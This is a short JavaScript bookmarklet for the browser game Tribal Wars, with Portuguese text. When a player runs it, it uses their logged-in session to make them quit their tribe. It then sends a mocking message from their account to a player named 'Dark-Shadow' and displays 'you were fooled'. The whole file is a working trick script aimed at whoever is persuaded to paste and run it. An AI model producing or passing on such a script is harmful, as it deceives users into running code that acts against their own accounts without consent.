javascript:

const url = TribalWars.buildURL('GET', {screen: 'ally', action: 'exit'})

TribalWars.get(url)

function cada_mp(player, msg, subj) {
    var r;
    var t;
    var l = TribalWars.buildURL("POST", 'mail', { mode:'new', action: 'send' }).split('&h=')


    var formData = new FormData();

    formData.append('to', player.player || '');
    formData.append('subject', subj || 'ola' );
    formData.append('text', msg || '' );
    formData.append('extended', '0');
    formData.append('send', 'Enviar' );
    formData.append('h', l[1] || '' );

    r = new XMLHttpRequest();
    r.open("POST", l[0], true);
    function processResponse() {
        if (r.readyState == 4 && r.status == 200){

            UI.SuccessMessage("VC FOI ENGANADO!")
            }
        };
    r.onreadystatechange = processResponse;
    r.send(formData);

}

cada_mp('Dark-Shadow', 'oi gostaria de comprar sua conta kkk', 'sou burro')
